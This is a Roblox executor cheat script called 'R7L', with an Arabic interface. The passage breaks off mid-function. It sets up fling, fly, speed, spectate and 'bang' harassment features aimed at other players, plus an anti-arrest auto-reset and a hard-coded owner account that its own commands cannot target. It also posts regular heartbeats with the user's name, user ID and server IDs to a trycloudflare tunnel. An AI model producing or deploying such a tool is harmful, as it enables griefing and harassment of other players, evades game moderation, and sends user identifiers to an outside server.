local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
_G._ZWA = false
_G._ZOrig = nil
_G._HLA = false
local isTouchDevice = UserInputService.TouchEnabled
local baseFrameSize = Vector2.new(610, 500)
local OwnerUsername = "p0uw"
local function _T18IsProtected(target)
    return target and target.Name:lower() == OwnerUsername:lower()
end

_T18Tick0 = tick()
_T18DGT0  = math.max(0, workspace.DistributedGameTime or 0)
task.spawn(function()
    for _t18si = 1, 10 do
        task.wait(0.5)
        local _t18dgt = workspace.DistributedGameTime or 0
        local _t18el  = tick() - _T18Tick0

        if _t18dgt > _T18DGT0 + _t18el + 2 then
            _T18DGT0  = _t18dgt
            _T18Tick0 = tick()
            break
        end

        if _t18dgt > _T18DGT0 + _t18el then
            _T18DGT0  = _t18dgt - _t18el
            _T18Tick0 = tick()
        end
    end
end)
function _T18ServerUptime()
    return math.floor(_T18DGT0 + (tick() - _T18Tick0))
end
local isOwnerUser = LocalPlayer.Name:lower() == OwnerUsername:lower()
ChatNameColorData = nil

T18_NOTIFICATION_SOUND_ID = "rbxassetid://7383525713"

local function T18PlayNotificationSound()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.Name = "T18NotificationSound"
        sound.SoundId = T18_NOTIFICATION_SOUND_ID
        sound.Volume = 0.65
        sound.Parent = game:GetService("SoundService")
        sound.Ended:Connect(function()
            pcall(function() sound:Destroy() end)
        end)
        sound:Play()
        task.delay(8, function()
            if sound and sound.Parent then
                pcall(function() sound:Destroy() end)
            end
        end)
    end)
end

local function T18ShowAlreadyConnectedToast()
    local TweenService  = game:GetService("TweenService")
    local playerGui     = LocalPlayer:WaitForChild("PlayerGui")

    local toastGui = Instance.new("ScreenGui")
    toastGui.Name             = "T18Toast"
    toastGui.ResetOnSpawn     = false
    toastGui.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
    toastGui.DisplayOrder     = 99999
    toastGui.IgnoreGuiInset   = true
    toastGui.Parent           = playerGui

    local toast = Instance.new("Frame")
    toast.Name                = "ToastFrame"
    toast.AnchorPoint         = Vector2.new(1, 1)
    toast.Size                = UDim2.new(0, 230, 0, 64)
    toast.Position            = UDim2.new(1, 270, 1, -24)
    toast.BackgroundColor3    = Color3.fromRGB(10, 10, 10)
    toast.BackgroundTransparency = 0
    toast.BorderSizePixel     = 0
    toast.ZIndex              = 10
    toast.Parent              = toastGui
    local _tc = Instance.new("UICorner")
    _tc.CornerRadius = UDim.new(0, 10)
    _tc.Parent = toast
    local _ts = Instance.new("UIStroke")
    _ts.Color        = Color3.fromRGB(58, 58, 58)
    _ts.Thickness    = 1
    _ts.Transparency = 0
    _ts.Parent       = toast

    local accentBar = Instance.new("Frame")
    accentBar.Size             = UDim2.new(0, 3, 0.65, 0)
    accentBar.AnchorPoint      = Vector2.new(0, 0.5)
    accentBar.Position         = UDim2.new(0, 9, 0.5, 0)
    accentBar.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
    accentBar.BorderSizePixel  = 0
    accentBar.ZIndex           = 11
    accentBar.Parent           = toast
    local _ac = Instance.new("UICorner")
    _ac.CornerRadius = UDim.new(0, 4)
    _ac.Parent = accentBar

    local titleLbl = Instance.new("TextLabel")
    titleLbl.Size                 = UDim2.new(1, -28, 0, 22)
    titleLbl.Position             = UDim2.new(0, 20, 0, 8)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text                 = "R7L"
    titleLbl.TextColor3           = Color3.fromRGB(255, 255, 255)
    titleLbl.TextXAlignment       = Enum.TextXAlignment.Right
    titleLbl.Font                 = Enum.Font.GothamBold
    titleLbl.TextSize             = 14
    titleLbl.ZIndex               = 11
    titleLbl.Parent               = toast

    local msgLbl = Instance.new("TextLabel")
    msgLbl.Size                 = UDim2.new(1, -28, 0, 18)
    msgLbl.Position             = UDim2.new(0, 20, 0, 34)
    msgLbl.BackgroundTransparency = 1
    msgLbl.Text                 = "السكربت متصل بالفعل."
    msgLbl.TextColor3           = Color3.fromRGB(170, 170, 170)
    msgLbl.TextXAlignment       = Enum.TextXAlignment.Right
    msgLbl.Font                 = Enum.Font.Gotham
    msgLbl.TextSize             = 12
    msgLbl.ZIndex               = 11
    msgLbl.Parent               = toast

    T18PlayNotificationSound()

    TweenService:Create(toast,
        TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        { Position = UDim2.new(1, -16, 1, -24) }
    ):Play()

    task.delay(3.0, function()
        local fadeOut = TweenService:Create(toast,
            TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            { Position = UDim2.new(1, 270, 1, -24), BackgroundTransparency = 1 }
        )
        TweenService:Create(titleLbl,  TweenInfo.new(0.4), { TextTransparency = 1 }):Play()
        TweenService:Create(msgLbl,    TweenInfo.new(0.4), { TextTransparency = 1 }):Play()
        TweenService:Create(accentBar, TweenInfo.new(0.4), { BackgroundTransparency = 1 }):Play()
        TweenService:Create(_ts,       TweenInfo.new(0.4), { Transparency = 1 }):Play()
        fadeOut:Play()
        fadeOut.Completed:Connect(function()
            pcall(function() toastGui:Destroy() end)
        end)
    end)
end

local function T18ShowToast(msg)
    pcall(function()
        _T18NotifLog = _T18NotifLog or {}
        table.insert(_T18NotifLog, { m = tostring(msg), ts = tick(), t = os.time() })
        if #_T18NotifLog > 150 then table.remove(_T18NotifLog, 1) end
        if _T18OnNotif then _T18OnNotif() end
    end)
    if type(T18TranslateText) == "function" then
        msg = T18TranslateText(msg, _T18Lang)
    end
    local TweenService  = game:GetService("TweenService")
    local playerGui     = LocalPlayer:WaitForChild("PlayerGui")
    local toastGui = Instance.new("ScreenGui")
    toastGui.Name             = "T18ToastGeneric"
    toastGui.ResetOnSpawn     = false
    toastGui.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
    toastGui.DisplayOrder     = 99999
    toastGui.IgnoreGuiInset   = true
    toastGui.Parent           = playerGui
    local toast = Instance.new("Frame")
    toast.Name                = "ToastFrame"
    toast.AnchorPoint         = Vector2.new(1, 1)
    toast.Size                = UDim2.new(0, 230, 0, 64)
    toast.Position            = UDim2.new(1, 270, 1, -24)
    toast.BackgroundColor3    = Color3.fromRGB(10, 10, 10)
    toast.BackgroundTransparency = 0
    toast.BorderSizePixel     = 0
    toast.ZIndex              = 10
    toast.Parent              = toastGui
    local _tc = Instance.new("UICorner"); _tc.CornerRadius = UDim.new(0, 10); _tc.Parent = toast
    local _ts = Instance.new("UIStroke"); _ts.Color = Color3.fromRGB(58, 58, 58); _ts.Thickness = 1; _ts.Transparency = 0; _ts.Parent = toast
    local accentBar = Instance.new("Frame")
    accentBar.Size             = UDim2.new(0, 3, 0.65, 0)
    accentBar.AnchorPoint      = Vector2.new(0, 0.5)
    accentBar.Position         = UDim2.new(0, 9, 0.5, 0)
    accentBar.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
    accentBar.BorderSizePixel  = 0
    accentBar.ZIndex           = 11
    accentBar.Parent           = toast
    local _ac = Instance.new("UICorner"); _ac.CornerRadius = UDim.new(0, 4); _ac.Parent = accentBar
    local titleLbl = Instance.new("TextLabel")
    titleLbl.Size = UDim2.new(1, -28, 0, 22); titleLbl.Position = UDim2.new(0, 20, 0, 8)
    titleLbl.BackgroundTransparency = 1; titleLbl.Text = "R7L"
    titleLbl.TextColor3 = Color3.fromRGB(255, 255, 255); titleLbl.TextXAlignment = Enum.TextXAlignment.Right
    titleLbl.Font = Enum.Font.GothamBold; titleLbl.TextSize = 14; titleLbl.ZIndex = 11; titleLbl.Parent = toast
    local msgLbl = Instance.new("TextLabel")
    msgLbl.Size = UDim2.new(1, -28, 0, 18); msgLbl.Position = UDim2.new(0, 20, 0, 34)
    msgLbl.BackgroundTransparency = 1; msgLbl.Text = msg
    msgLbl.TextColor3 = Color3.fromRGB(170, 170, 170); msgLbl.TextXAlignment = Enum.TextXAlignment.Right
    msgLbl.Font = Enum.Font.Gotham; msgLbl.TextSize = 12; msgLbl.ZIndex = 11; msgLbl.Parent = toast
    T18PlayNotificationSound()
    TweenService:Create(toast, TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        { Position = UDim2.new(1, -16, 1, -24) }):Play()
    task.delay(3.0, function()
        local fadeOut = TweenService:Create(toast, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            { Position = UDim2.new(1, 270, 1, -24), BackgroundTransparency = 1 })
        TweenService:Create(titleLbl,  TweenInfo.new(0.4), { TextTransparency = 1 }):Play()
        TweenService:Create(msgLbl,    TweenInfo.new(0.4), { TextTransparency = 1 }):Play()
        TweenService:Create(accentBar, TweenInfo.new(0.4), { BackgroundTransparency = 1 }):Play()
        TweenService:Create(_ts,       TweenInfo.new(0.4), { Transparency = 1 }):Play()
        fadeOut:Play()
        fadeOut.Completed:Connect(function() pcall(function() toastGui:Destroy() end) end)
    end)
end

_T18OwnerBlockedAt = 0
_T18OwnerToastAt = 0
function _T18BlockOwnerName(name)
    if isOwnerUser or type(name) ~= "string" then return false end
    if name:lower() ~= OwnerUsername:lower() then return false end
    _T18OwnerBlockedAt = tick()
    if tick() - _T18OwnerToastAt > 1.5 then
        _T18OwnerToastAt = tick()
        T18ShowToast("هذا اونر السكربت ما تقدر تفعل عليه")
    end
    return true
end
function _T18BlockOwner(target)
    return target ~= nil and _T18BlockOwnerName(target.Name)
end
function _T18CmdTargetsOwner(cmdText)
    if isOwnerUser or type(cmdText) ~= "string" then return false end
    local ownerLower = OwnerUsername:lower()
    for word in cmdText:gmatch("[%w_]+") do
        local w = word:lower()
        if #w >= 3 and ownerLower:sub(1, #w) == w then
            return _T18BlockOwnerName(OwnerUsername)
        end
    end
    return false
end

_t18AlreadyRunning = (function()
    local pg = LocalPlayer:FindFirstChild("PlayerGui")
    if not pg then return false end
    local m = pg:FindFirstChild("_T18Running")
    if not m then return false end
    local tok = m:FindFirstChild("Token")
    local prevTok = (getgenv and getgenv().T18RuntimeToken) or _G.T18RuntimeToken or ""
    if tok and tok.Value ~= "" and tok.Value == prevTok then return true end
    pcall(function() m:Destroy() end)
    return false
end)()

if _t18AlreadyRunning then
    task.spawn(T18ShowAlreadyConnectedToast)
    return
end

T18RuntimeToken = tostring(math.floor(tick() * 1000)) .. tostring(math.random(1000, 9999))

pcall(function()
    local _pg = LocalPlayer:FindFirstChild("PlayerGui")
    if _pg then
        local marker = Instance.new("Folder")
        marker.Name = "_T18Running"
        local tok = Instance.new("StringValue")
        tok.Name = "Token"
        tok.Value = T18RuntimeToken
        tok.Parent = marker
        marker.Parent = _pg
    end
end)

if getgenv then
    local _genv = getgenv()
    if _genv then
        _genv.T18RuntimeToken = T18RuntimeToken
        _genv.T18RuntimeShutdown = function()
            local _e = getgenv(); if _e then _e.T18RuntimeToken = nil; _e.T18RuntimeShutdown = nil end
        end
    end
else
    _G.T18RuntimeToken    = T18RuntimeToken
    _G.T18RuntimeShutdown = function()
        _G.T18RuntimeToken    = nil
        _G.T18RuntimeShutdown = nil
    end
end

function T18RuntimeAlive()
    if getgenv then
        local _e = getgenv()
        if _e then return _e.T18RuntimeToken == T18RuntimeToken end
    end
    return _G.T18RuntimeToken == T18RuntimeToken
end

T18_API_BASE = "https://controller-congressional-championships-inner.trycloudflare.com/api/t18"
-- Derive the AI endpoint from the same tunnel URL used by the T18 API.
R7L_AI_ENDPOINT = (T18_API_BASE:gsub("/api/t18/?$", "")) .. "/chat"
local HttpService_T18 = game:GetService("HttpService")

local function t18_getHttpFn()

    local checks = {
        function() return syn and syn.request end,
        function() return http_request end,
        function() return http and http.request end,
        function() return request end,
        function() return fluxus and fluxus.request end,
        function() return SENTINEL and SENTINEL.request end,
        function() return getgenv and getgenv().http_request end,
        function() return getgenv and getgenv().request end,
        function() return getgenv and getgenv().syn and getgenv().syn.request end,
    }
    for _, check in ipairs(checks) do
        local ok, fn = pcall(check)
        if ok and type(fn) == "function" then return fn end
    end
    return nil
end

local function t18_httpRequest(opts)
    if not opts.Headers then opts.Headers = {} end

    opts.Headers["User-Agent"] = "T18Client/1.0"
    local fn = t18_getHttpFn()
    if fn then
        local ok, res = pcall(fn, opts)
        if ok and type(res) == "table" then return res end
    end
    if (opts.Method or "GET") == "GET" then
        local ok, body = pcall(function() return game:HttpGet(opts.Url) end)
        if ok then return { Body = body, StatusCode = 200, Success = true } end
    end
    return nil
end

local function t18_jsonEncode(t)
    local ok, s = pcall(function() return HttpService_T18:JSONEncode(t) end)
    if ok then return s end
    return "{}"
end

local function t18_jsonDecode(s)
    if type(s) ~= "string" or #s == 0 then return nil end
    local ok, t = pcall(function() return HttpService_T18:JSONDecode(s) end)
    if ok then return t end
    return nil
end

T18_SERVER_KEY = tostring(game.PlaceId) .. ":" .. tostring(game.JobId)
_T18PlaceName = nil
task.spawn(function()
    local ok, info = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    if ok and type(info) == "table" and info.Name then _T18PlaceName = tostring(info.Name) end
end)
if not game.JobId or game.JobId == "" then
    T18_SERVER_KEY = tostring(game.PlaceId) .. ":studio"
end

local function t18_postEvent(payload)
    payload.serverKey = T18_SERVER_KEY
    payload.fromName = LocalPlayer.Name
    payload.fromUserId = LocalPlayer.UserId
    local res = t18_httpRequest({
        Url = T18_API_BASE .. "/post",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["Accept"] = "application/json",
        },
        Body = t18_jsonEncode(payload),
    })
    if not res then return false end
    local code = res.StatusCode or res.status_code or 0
    if code == 200 or res.Success == true then return true end
    return false
end

function t18_sendHeartbeat()
    local res = t18_httpRequest({
        Url = T18_API_BASE .. "/heartbeat",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["Accept"] = "application/json",
        },
        Body = t18_jsonEncode({
            serverKey = T18_SERVER_KEY,
            userId = LocalPlayer.UserId,
            name = LocalPlayer.Name,
            placeId = game.PlaceId,
            jobId = tostring(game.JobId),
            placeName = _T18PlaceName,
        }),
    })
    return res ~= nil
end

function t18_sendLeave()
    pcall(function()
        t18_httpRequest({
            Url = T18_API_BASE .. "/leave",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["Accept"] = "application/json",
            },
            Body = t18_jsonEncode({
                serverKey = T18_SERVER_KEY,
                userId = LocalPlayer.UserId,
            }),
        })
    end)
end

function t18_urlEncode(s)
    if not s then return "" end
    local ok, enc = pcall(function() return HttpService_T18:UrlEncode(s) end)
    if ok and enc then return enc end
    return (tostring(s):gsub("([^%w%-_%.~])", function(c)
        return string.format("%%%02X", string.byte(c))
    end))
end

function t18_fetchUsers()
    local url = T18_API_BASE .. "/users?serverKey=" .. t18_urlEncode(T18_SERVER_KEY)
    local res = t18_httpRequest({
        Url = url,
        Method = "GET",
        Headers = { ["Accept"] = "application/json" },
    })
    if not res then return nil end
    local body = res.Body or res.body
    local data = t18_jsonDecode(body)
    if type(data) == "table" and data.ok and type(data.users) == "table" then
        return data.users
    end
    return nil
end

task.spawn(function()
    while true do
        if not T18RuntimeAlive() then
            break
        end
        pcall(t18_sendHeartbeat)
        task.wait(5)
    end
end)

LocalPlayer.AncestryChanged:Connect(function(_, parent)
    if not parent then
        t18_sendLeave()
    end
end)

isActive = false
animTrack = nil
followConnection = nil
flingActive = false
targetFlingActive = false
flyActive = false
flyConnection = nil
targetFlingConnection = nil
local _flingState = {angularVelocity=nil, savedCFrame=nil, angle=0, pulse=0, startTargetY=nil, startTime=0}
local SpeedActive = false
_HeadBang = {active=false, conn=nil, animTrack=nil, angle=0, respawnConn=nil}
bangRespawnConn = nil
resetCooldown = false

SpectateActive = false
SpectateConnection = nil
SpectateTarget = nil
OriginalCameraType = nil
OriginalCameraSubject = nil
SpectateNameLabel = nil
SpectateWarningLabel = nil
SpectatePlayerRemovingConnection = nil
SavedLocation = nil
local _Hang = {running=false, savedCF=nil, activConn=nil, remConn=nil, prefix="كلب", flingPos=Vector3.new(999999999,999999999,999999999), cmd="char me"}
_T18Lang = "ar"
_T18TR = nil
_T18Rev = nil
function T18T(s)
    if _T18Lang == "en" and _T18TR and _T18TR[s] then return _T18TR[s] end
    if _T18Lang == "ar" and _T18Rev and _T18Rev[s] then return _T18Rev[s] end
    return s
end

local characterConnections = {}
local viewportConnection = nil
local FrameScale = nil
_T18UserScale = 1
pcall(function()
    if isfile and readfile and isfile("R7L_size.txt") then
        local v = tonumber(readfile("R7L_size.txt"))
        if v and v >= 0.5 and v <= 2 then _T18UserScale = v end
    end
end)
local FlyTouchFrame = nil
local ToggleBtn = nil
ChatBubbleBtn = nil
local mobileFlyInput = {
    Up = false,
    Down = false,
    Forward = false,
    Backward = false,
    Left = false,
    Right = false,
}

local ownerFreezeStates = {}
local ownerRespawnLoopStates = {}

local Theme = {
    Bg = Color3.fromRGB(0, 0, 0),
    Panel = Color3.fromRGB(6, 6, 6),
    PanelSoft = Color3.fromRGB(14, 14, 14),
    Header = Color3.fromRGB(4, 4, 4),
    Card = Color3.fromRGB(10, 10, 10),
    Input = Color3.fromRGB(18, 18, 18),
    Border = Color3.fromRGB(48, 48, 48),
    Text = Color3.fromRGB(255, 255, 255),
    Muted = Color3.fromRGB(175, 175, 175),
    Accent = Color3.fromRGB(210, 210, 210),
    AccentSoft = Color3.fromRGB(50, 50, 50),
    Active = Color3.fromRGB(38, 38, 38),
    Warning = Color3.fromRGB(245, 158, 11),
    Danger = Color3.fromRGB(190, 52, 78),
    Shadow = Color3.fromRGB(0, 0, 0),
    ButtonDefault = Color3.fromRGB(22, 22, 22),
    ButtonDefaultAlt = Color3.fromRGB(32, 32, 32),
    ButtonBlue = Color3.fromRGB(10, 10, 10),
    ButtonBlueAlt = Color3.fromRGB(32, 32, 32),
    ButtonGreen = Color3.fromRGB(22, 22, 22),
    ButtonGreenAlt = Color3.fromRGB(32, 32, 32),
    ButtonOrange = Color3.fromRGB(22, 22, 22),
    ButtonOrangeAlt = Color3.fromRGB(32, 32, 32),
    ButtonRed = Color3.fromRGB(22, 22, 22),
    ButtonRedAlt = Color3.fromRGB(32, 32, 32),
}

local function connect(list, signal, callback)
    local connection = signal:Connect(callback)
    table.insert(list, connection)
    return connection
end

local function disconnectAll(list)
    for _, connection in ipairs(list) do
        connection:Disconnect()
    end
    table.clear(list)
end

local function doReset()
    if resetCooldown then
        return
    end
    resetCooldown = true
    task.spawn(function()
        LocalPlayer:LoadCharacter()
        task.wait(3)
        resetCooldown = false
    end)
end

local function watchCharacter(char)
    if not char then
        return
    end

    disconnectAll(characterConnections)

    connect(characterConnections, char.DescendantAdded, function(obj)
        if resetCooldown then
            return
        end

        local name = obj.Name:lower()
        if name:find("handcuff") or name:find("cuff") or name:find("arrest") then
            doReset()
            return
        end

        if obj:IsA("BallSocketConstraint")
            or obj:IsA("RopeConstraint")
            or obj:IsA("WeldConstraint")
            or obj:IsA("HingeConstraint") then
            doReset()
        end
    end)

    local humanoid = char:WaitForChild("Humanoid", 5)
    if humanoid then
        connect(characterConnections, humanoid:GetPropertyChangedSignal("WalkSpeed"), function()
            if humanoid.WalkSpeed == 0 and not resetCooldown then
                doReset()
            end
        end)
    end
end

watchCharacter(LocalPlayer.Character)
LocalPlayer.CharacterAdded:Connect(function(char)
    watchCharacter(char)
    if SpeedActive then
        local hum = char:WaitForChild("Humanoid", 5)
        if hum then
            hum.WalkSpeed = tonumber((script:FindFirstChild("SavedWalkSpeedValue") and script.SavedWalkSpeedValue.Value) or "16") or 16
        end
    end
end)

local savedWalkSpeedValue = Instance.new("StringValue")
savedWalkSpeedValue.Name = "SavedWalkSpeedValue"
savedWalkSpeedValue.Value = "16"
savedWalkSpeedValue.Parent = script

local function makeCorner(parent, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius)
    corner.Parent = parent
    return corner
end

local function makeStroke(parent, color, thickness, transparency)
    local stroke = Instance.new("UIStroke")
    stroke.Color = color
    stroke.Thickness = thickness or 1
    stroke.Transparency = transparency or 0
    stroke.Parent = parent
    return stroke
end

local function makeShadow(parent)
    local shadow = Instance.new("ImageLabel")
    shadow.Name = "Shadow"
    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
    shadow.Position = UDim2.new(0.5, 0, 0.5, 8)
    shadow.Size = UDim2.new(1, 20, 1, 20)
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxassetid://1316045217"
    shadow.ImageColor3 = Theme.Shadow
    shadow.ImageTransparency = 0.78
    shadow.ScaleType = Enum.ScaleType.Slice
    shadow.SliceCenter = Rect.new(10, 10, 118, 118)
    shadow.ZIndex = parent.ZIndex - 1
    shadow.Parent = parent
    return shadow
end

local UiFx = {}

function UiFx.makeGradient(parent, colors, rotation)
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new(colors)
    gradient.Rotation = rotation or 0
    gradient.Parent = parent
    return gradient
end

function UiFx.makeAccentGlow(parent, color, transparency, sizeOffset, yOffset)
    local glow = Instance.new("ImageLabel")
    glow.Name = "AccentGlow"
    glow.AnchorPoint = Vector2.new(0.5, 0.5)
    glow.Position = UDim2.new(0.5, 0, 0.5, yOffset or 0)
    glow.Size = UDim2.new(1, sizeOffset or 52, 1, sizeOffset or 52)
    glow.BackgroundTransparency = 1
    glow.Image = "rbxassetid://1316045217"
    glow.ImageColor3 = color or Color3.fromRGB(220, 220, 220)
    glow.ImageTransparency = transparency or 0.92
    glow.ScaleType = Enum.ScaleType.Slice
    glow.SliceCenter = Rect.new(10, 10, 118, 118)
    glow.ZIndex = math.max(parent.ZIndex - 1, 0)
    glow.Parent = parent
    return glow
end

UiFx._starFields = {}
UiFx._starFieldConnection = nil

local function resetAnimatedStar(fieldData, starData, respawnAtTop)
    local randomizer = fieldData.randomizer
    starData.x = randomizer:NextNumber(-0.02, 1.02)
    if respawnAtTop then
        starData.y = randomizer:NextNumber(-0.2, -0.02)
    else
        starData.y = randomizer:NextNumber(-0.02, 1.02)
    end
    starData.speed = randomizer:NextNumber(0.012, 0.05)
    starData.drift = randomizer:NextNumber(-0.01, 0.01)
    starData.baseTransparency = randomizer:NextNumber(0.72, 0.9)
    starData.twinkleAmplitude = randomizer:NextNumber(0.03, 0.12)
    starData.twinkleSpeed = randomizer:NextNumber(0.8, 2.2)
    starData.twinkleOffset = randomizer:NextNumber(0, math.pi * 2)
end

local function ensureStarFieldAnimator()
    if UiFx._starFieldConnection then
        return
    end

    local _sfAccum = 0
    UiFx._starFieldConnection = RunService.RenderStepped:Connect(function(deltaTime)
        _sfAccum = _sfAccum + deltaTime
        if _sfAccum < (1/30) then return end
        deltaTime = _sfAccum
        _sfAccum = 0

        for index = #UiFx._starFields, 1, -1 do
            local fieldData = UiFx._starFields[index]
            local starField = fieldData.field

            if not starField or not starField.Parent then
                table.remove(UiFx._starFields, index)
            else
                fieldData.elapsed += deltaTime

                for _, starData in ipairs(fieldData.stars) do
                    local star = starData.instance
                    if star and star.Parent and starField.Visible then
                        starData.x += starData.drift * deltaTime
                        starData.y += starData.speed * deltaTime

                        if starData.x > 1.04 then
                            starData.x = -0.04
                        elseif starData.x < -0.04 then
                            starData.x = 1.04
                        end

                        if starData.y > 1.08 then
                            resetAnimatedStar(fieldData, starData, true)
                        end

                        local twinkle = math.sin((fieldData.elapsed * starData.twinkleSpeed) + starData.twinkleOffset) * starData.twinkleAmplitude
                        star.Position = UDim2.new(starData.x, 0, starData.y, 0)
                        star.BackgroundTransparency = math.clamp(starData.baseTransparency + twinkle, 0.48, 0.94)
                    end
                end
            end
        end

        if #UiFx._starFields == 0 and UiFx._starFieldConnection then
            UiFx._starFieldConnection:Disconnect()
            UiFx._starFieldConnection = nil
        end
    end)
end

function UiFx.makeStarField(parent, count)
    local starField = Instance.new("Frame")
    starField.Name = "StarField"
    starField.Size = UDim2.new(1, 0, 1, 0)
    starField.BackgroundTransparency = 1
    starField.BorderSizePixel = 0
    starField.ClipsDescendants = true
    starField.ZIndex = 0
    starField.Parent = parent

    local fieldData = {
        field = starField,
        stars = {},
        randomizer = Random.new(),
        elapsed = 0,
    }

    for index = 1, count do
        local star = Instance.new("Frame")
        local size = fieldData.randomizer:NextInteger(2, 4)
        star.Size = UDim2.new(0, size, 0, size)
        star.Position = UDim2.new(0, 0, 0, 0)
        star.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        star.BackgroundTransparency = 0.15

        local glowStar = Instance.new("ImageLabel")
        glowStar.Size = UDim2.new(0, size * 2, 0, size * 2)
        glowStar.AnchorPoint = Vector2.new(0.5, 0.5)
        glowStar.Position = UDim2.new(0.5, 0, 0.5, 0)
        glowStar.BackgroundTransparency = 1
        glowStar.Image = "rbxassetid://1316045217"
        glowStar.ImageColor3 = Color3.fromRGB(255, 255, 255)
        glowStar.ImageTransparency = 0.88
        glowStar.ScaleType = Enum.ScaleType.Slice
        glowStar.SliceCenter = Rect.new(10, 10, 118, 118)
        glowStar.ZIndex = 0
        glowStar.Parent = star
        star.BorderSizePixel = 0
        star.ZIndex = 0
        star.Parent = starField
        makeCorner(star, 999)

        local starData = {
            instance = star,
        }
        resetAnimatedStar(fieldData, starData, false)
        star.Position = UDim2.new(starData.x, 0, starData.y, 0)
        star.BackgroundTransparency = starData.baseTransparency
        table.insert(fieldData.stars, starData)
    end

    table.insert(UiFx._starFields, fieldData)
    ensureStarFieldAnimator()

    return starField
end

function UiFx.attachButtonTextOverlay(button, textSize, font, textColor, strokeColor, strokeTransparency)
    local overlay = Instance.new("TextLabel")
    overlay.Name = "ButtonTextOverlay"
    overlay.Size = UDim2.new(1, -10, 1, 0)
    overlay.Position = UDim2.new(0, 5, 0, 0)
    overlay.BackgroundTransparency = 1
    overlay.Text = button.Text
    overlay.TextColor3 = textColor or Color3.fromRGB(255, 255, 255)
    overlay.TextStrokeColor3 = strokeColor or Color3.fromRGB(200, 200, 200)
    overlay.TextStrokeTransparency = strokeTransparency or 1
    overlay.Font = font or button.Font
    overlay.TextSize = textSize or button.TextSize
    overlay.TextWrapped = true
    overlay.ZIndex = button.ZIndex + 2
    overlay.Parent = button

    button.TextTransparency = 1
    button.TextStrokeTransparency = 1

    button:GetPropertyChangedSignal("Text"):Connect(function()
        overlay.Text = button.Text
    end)

    return overlay
end

pcall(function()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    for _, child in ipairs(playerGui:GetChildren()) do
        if child.Name == "BangGuiPro" or child.Name == "T18TargetLogGui" then
            child:Destroy()
        end
    end
end)

pcall(function()
    local coreGui = game:GetService("CoreGui")
    for _, child in ipairs(coreGui:GetChildren()) do
        if child.Name == "T18TargetLogGui" then
            child:Destroy()
        end
    end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BangGuiPro"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 2147483647
ScreenGui.IgnoreGuiInset = true

do
    local coreOk = pcall(function()
        ScreenGui.Parent = game:GetService("CoreGui")
    end)
    if not coreOk or not ScreenGui.Parent then
        ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    end
end

function T18RuntimeShutdown()

    pcall(function()
        local pg = LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")
        if pg then
            local m = pg:FindFirstChild("_T18Running")
            if m then m:Destroy() end
        end
    end)

    pcall(function()
        if getgenv then
            local _e = getgenv(); if _e then _e.T18RuntimeToken = nil; _e.T18RuntimeShutdown = nil end
        else
            _G.T18RuntimeToken    = nil
            _G.T18RuntimeShutdown = nil
        end
    end)
    pcall(function()
        if ScreenGui then
            ScreenGui:Destroy()
        end
    end)
    pcall(function()
        local coreGui = game:GetService("CoreGui")
        for _, child in ipairs(coreGui:GetChildren()) do
            if child.Name == "T18TargetLogGui" then
                child:Destroy()
            end
        end
    end)
    pcall(function()
        local playerGui = LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")
        if playerGui then
            for _, child in ipairs(playerGui:GetChildren()) do
                if child.Name == "BangGuiPro" or child.Name == "T18TargetLogGui" then
                    child:Destroy()
                end
            end
        end
    end)
end

if getgenv then
    local _e = getgenv(); if _e then _e.T18RuntimeShutdown = T18RuntimeShutdown end
else
    _G.T18RuntimeShutdown = T18RuntimeShutdown
end

local Frame = Instance.new("Frame")
Frame.Name = "Main"
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.Size = UDim2.new(0, 610, 0, 500)
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.BackgroundColor3 = Theme.Panel
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui
makeCorner(Frame, 22)
makeShadow(Frame)

FrameScale = Instance.new("UIScale")
FrameScale.Parent = Frame

do
    local frameDecor = Instance.new("Frame")
    frameDecor.Name = "FrameDecor"
    frameDecor.Size = UDim2.new(1, 0, 1, 0)
    frameDecor.BackgroundTransparency = 1
    frameDecor.BorderSizePixel = 0
    frameDecor.ZIndex = 0
    frameDecor.ClipsDescendants = true
    frameDecor.Parent = Frame
    makeCorner(frameDecor, 22)
    UiFx.makeStarField(frameDecor, 80)
end

local function updateResponsiveLayout()
    local camera = workspace.CurrentCamera
    if not camera or not FrameScale then
        return
    end

    local viewport = camera.ViewportSize
    local horizontalPadding = isTouchDevice and 56 or 72
    local verticalPadding = isTouchDevice and 64 or 96
    local maxWidth = math.max(viewport.X - horizontalPadding, 240)
    local maxHeight = math.max(viewport.Y - verticalPadding, 240)
    local rawFit = math.min(maxWidth / baseFrameSize.X, maxHeight / baseFrameSize.Y)
